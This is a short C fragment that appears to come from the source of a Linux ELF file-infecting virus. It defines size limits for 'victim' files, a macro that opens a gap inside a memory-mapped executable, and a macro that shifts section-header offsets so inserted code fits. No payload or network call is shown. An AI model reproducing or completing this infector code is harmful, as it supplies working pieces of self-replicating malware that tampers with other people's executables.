#define	MIN_VICTIM_SIZE	1024
#define	MAX_VICTIM_SIZE	3*1024*1024
#define	ELFOSABI_TARGET	ELFOSABI_LINUX
#define	PAGE_SIZE	4096

#define	MAKE_HOLE(off,size) do {			\
	ftruncate(h,l+size);				\
	m = (char*)mremap(m,l,l + size, 0);		\
	if (m == MAP_FAILED) {				\
		goto _close;				\
	}						\
	if (off < l)					\
		memmove(m+off+size, m+off, l-off);	\
	l += size;					\
} while(0)
#define	SHIFT_SHDRS(offset,delta) do {			\
	if (ehdr->e_shoff >= offset)			\
		ehdr->e_shoff += delta;			\
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);	\
	for (i = 0; i < ehdr->e_shnum; i++)		\
		if (shdr[i].sh_offset >= offset)	\
			shdr[i].sh_offset += delta;	\
} while(0)
